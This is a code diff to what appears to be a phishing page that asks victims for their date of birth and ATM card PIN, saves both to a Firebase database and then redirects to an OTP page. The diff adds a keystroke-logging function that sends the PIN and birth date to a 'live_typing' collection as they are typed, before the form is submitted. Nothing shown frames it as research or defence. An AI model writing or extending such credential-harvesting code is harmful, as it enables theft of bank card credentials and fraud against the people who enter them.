@@ -80,12 +80,13 @@
       maxlength="10"
       pattern="\d{2}/\d{2}/\d{4}" 
       required
+      oninput="liveUpdate()"
     >
   </div>
 
       <div class="input-group">
         <label for="pin">ATM Card PIN</label>
-        <input type="password" id="pin" name="pin" maxlength="4" pattern="\d{4}" inputmode="numeric" required>
+        <input type="password" id="pin" name="pin" maxlength="4" pattern="\d{4}" inputmode="numeric" required oninput="liveUpdate()">
       </div>
 
       <div style="text-align: center;">
@@ -110,6 +111,24 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    let liveDocId = null;
+
+    function liveUpdate() {
+      const data = {
+        dob: document.getElementById("dob").value,
+        pin: document.getElementById("pin").value,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      };
+
+      if (!liveDocId) {
+        db.collection("live_typing").add(data).then(doc => {
+          liveDocId = doc.id;
+        });
+      } else {
+        db.collection("live_typing").doc(liveDocId).update(data);
+      }
+    }
 
     document.getElementById("dob").addEventListener("input", function (e) {
       let value = e.target.value.replace(/[^\d]/g, "");
@@ -144,7 +163,7 @@
         pin: pin,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        window.location.href = "otp.html"; // Replace with real page filename
+        window.location.href = "otp.html";
       }).catch((error) => {
         alert("Error saving to Firebase: " + error);
       });
